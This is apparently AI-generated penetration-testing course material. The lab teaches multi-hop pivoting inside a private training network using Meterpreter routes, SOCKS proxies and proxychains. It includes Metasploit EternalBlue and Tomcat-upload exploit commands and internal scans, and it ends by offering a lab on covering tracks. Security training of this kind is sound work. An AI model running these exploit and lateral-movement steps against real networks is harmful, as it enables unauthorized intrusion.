# **Lab 9.7 — Pivoting Into Additional Subnets (Advanced Multi‑Layer Pivoting)**

### _Week 09 — Internal Network Exploitation & Lateral Movement_

**Estimated Time:** 150–210 minutes  
**Difficulty:** Advanced  
**Tools:** Meterpreter, Metasploit Framework, SOCKS proxy, proxychains, nmap, Burp Suite, internal multi‑subnet lab

---

## **1. Purpose of This Lab**

This lab teaches you how to **pivot beyond the first internal subnet** and reach deeper internal networks that are _multiple hops away_ from your Kali machine.

By the end of this lab, you will be able to:

- Identify additional internal subnets from compromised internal hosts
- Establish **multi‑layer pivot chains**
- Route traffic through multiple Meterpreter sessions
- Use proxychains to reach 2–3 layers deep
- Perform recon and exploitation on deeper networks
- Build a complete multi‑pivot lateral movement map

This is the most advanced pivoting lab in Week 09 and prepares you for Week 10’s Active Directory exploitation.

---

## **2. Pre‑Lab Requirements**

You must have:

- Completed **Lab 9.1 (Pivoting)**
- Completed **Lab 9.2 (Internal Service Exploitation)**
- Completed **Lab 9.3 (Internal Web Exploitation)**
- Completed **Lab 9.4 (Credential Harvesting)**
- Completed **Lab 9.5 (Privilege Escalation)**
- At least **two internal hosts compromised**
- A working SOCKS proxy

Example topology:

```
Kali → Pivot #1 (10.10.10.x) → Pivot #2 (10.10.20.x) → Target Subnet (10.10.30.x)
```

---

## **3. Lab Tasks**

---

# **Task 1 — Identify Additional Internal Subnets From Pivot #1**

### **Objective**

Use the first compromised internal host to discover deeper networks.

### **Steps**

From Meterpreter on Host A:

```
ifconfig
route
```

Or:

```
shell
ip a
ip route
```

### **What to Observe**

- Additional NICs
- Routes to other subnets (e.g., 10.10.20.0/24)
- VPN or VLAN interfaces

### **Deliverable**

A list of deeper internal subnets discovered.

---

# **Task 2 — Scan the Newly Discovered Subnet From Pivot #1**

### **Objective**

Perform recon on the next subnet.

### **Steps**

Use Meterpreter’s portscan:

```
run portscan -r 10.10.20.0/24 -p 1-1000
```

Or:

```
run arp_scanner -r 10.10.20.0/24
```

### **What to Observe**

- Live hosts
- Open ports
- Potential pivot candidates

### **Deliverable**

A table of hosts and ports in the second subnet.

---

# **Task 3 — Exploit a Host in the Second Subnet**

### **Objective**

Gain a foothold on a deeper internal host.

### **Steps**

Use Metasploit modules through the pivot:

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.20.5
run
```

Or:

```
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.10.20.5
run
```

### **What to Observe**

- Exploit runs through the first pivot
- New Meterpreter session opens on Host B

### **Deliverable**

A note confirming exploitation of a second‑subnet host.

---

# **Task 4 — Add a Route for the Second Pivot**

### **Objective**

Use Host B as a new pivot point.

### **Steps**

Identify session ID:

```
sessions
```

Add route:

```
route add 10.10.30.0/24 3
```

(Replace `3` with Host B’s session ID.)

### **What to Observe**

- Metasploit now routes traffic through two pivots
- You can reach the third subnet

### **Deliverable**

A screenshot of `route print` showing multiple pivots.

---

# **Task 5 — Enable SOCKS Proxy for Multi‑Layer Pivoting**

### **Objective**

Use proxychains to reach deeper networks.

### **Steps**

Start SOCKS proxy (if not already running):

```
use auxiliary/server/socks_proxy
run
```

Configure proxychains:

```
socks4 127.0.0.1 1080
```

### **Deliverable**

A note confirming SOCKS proxy is active.

---

# **Task 6 — Scan the Third Subnet Using proxychains**

### **Objective**

Use external tools through the multi‑layer pivot.

### **Steps**

```
proxychains nmap -sT -Pn 10.10.30.0/24
```

### **What to Observe**

- nmap traffic flows through Pivot #1 → Pivot #2
- You can enumerate hosts 2–3 hops deep
- Latency increases but results are valid

### **Deliverable**

A list of hosts and ports in the third subnet.

---

# **Task 7 — Access Deep Internal Web Apps Through Burp**

### **Objective**

Use Burp Suite to browse web apps in the third subnet.

### **Steps**

Visit:

```
http://10.10.30.5:8080
```

### **What to Observe**

- Burp logs traffic
- You can map internal web apps multiple hops deep
- You can exploit them using Burp tools

### **Deliverable**

A list of internal endpoints discovered in the third subnet.

---

# **Task 8 — Establish a Third Pivot (Optional, Very Advanced)**

### **Objective**

Pivot into a **fourth** subnet.

### **Steps**

1. Exploit a host in 10.10.30.x.
2. Add a new route:

```
route add 10.10.40.0/24 4
```

3. Repeat recon.

### **What to Observe**

- You now have a **multi‑layer pivot chain**
- You can reach networks 3–4 hops deep

### **Deliverable**

A diagram of your multi‑layer pivot chain.

---

# **Task 9 — Build a Multi‑Layer Pivoting Attack Surface Map**

### **Objective**

Document everything discovered across all subnets.

### **Include:**

- Subnets
- Hosts
- Services
- Web apps
- Credentials
- Exploits used
- Pivot points
- Lateral movement paths

### **Deliverable**

A complete multi‑pivot attack surface map in your Obsidian vault.

---

## **4. Completion Criteria**

You have completed Lab 9.7 when you can:

- Identify deeper internal subnets
- Establish multiple pivot layers
- Route traffic through multiple Meterpreter sessions
- Use proxychains for multi‑hop scanning
- Access deep internal web apps
- Document a full multi‑layer pivot chain

---

## **5. Next Steps**

When you’re ready, say:

**“Next lab.”**

And I’ll generate **Lab 9.8 — Internal Network Cleanup & Covering Tracks** in the same course style.